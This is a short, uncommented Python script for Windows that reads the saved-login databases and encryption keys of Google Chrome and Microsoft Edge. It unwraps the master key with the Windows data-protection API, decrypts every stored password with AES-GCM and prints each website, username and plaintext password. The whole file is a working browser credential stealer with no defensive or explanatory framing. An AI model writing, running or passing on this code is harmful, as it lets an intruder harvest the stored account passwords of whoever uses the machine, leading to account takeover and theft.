from os import path, system, environ
from json import load
from sqlite3 import connect
from base64 import b64decode
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

google_LocalState = path.join(
    environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State')
google_LoginData = path.join(
    environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
edge_LocalState = path.join(
    environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Local State')
edge_LoginData = path.join(
    environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')


def GetString(LocalState):
    with open(LocalState, 'r', encoding='utf-8') as f:
        s = load(f)['os_crypt']['encrypted_key']
    return s


def pull_the_key(base64_encrypted_key):
    encrypted_key_with_header = b64decode(base64_encrypted_key)
    encrypted_key = encrypted_key_with_header[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key


def DecryptString(key, data):
    nonce, cipherbytes = data[3:15], data[15:]
    aesgcm = AESGCM(key)
    plainbytes = aesgcm.decrypt(nonce, cipherbytes, None)
    plaintext = plainbytes.decode('utf-8')
    return plaintext


if __name__ == '__main__':
    res_edge = []
    res_google = []
    if path.exists(edge_LoginData):
        con_edge = connect(edge_LoginData)
        res_edge = con_edge.execute(
            'select origin_url, username_value, password_value from logins').fetchall()
        con_edge.close()
        key_edge = pull_the_key(GetString(edge_LocalState))
        print("-------------Edge-------------")
        for i in res_edge:
            print("Website :", i[0])
            print("Username:", i[1])
            print("Password:", DecryptString(key_edge, i[2]))
            print("------------------------------")
    if path.exists(google_LoginData):
        con_google = connect(google_LoginData)
        res_google = con_google.execute(
            'select origin_url, username_value, password_value from logins').fetchall()
        con_google.close()
        key_google = pull_the_key(GetString(google_LocalState))
        print("-------------Chrome-------------")
        for i in res_google:
            print("Website :", i[0])
            print("Username:", i[1])
            print("Password:", DecryptString(key_google, i[2]))
            print("------------------------------")
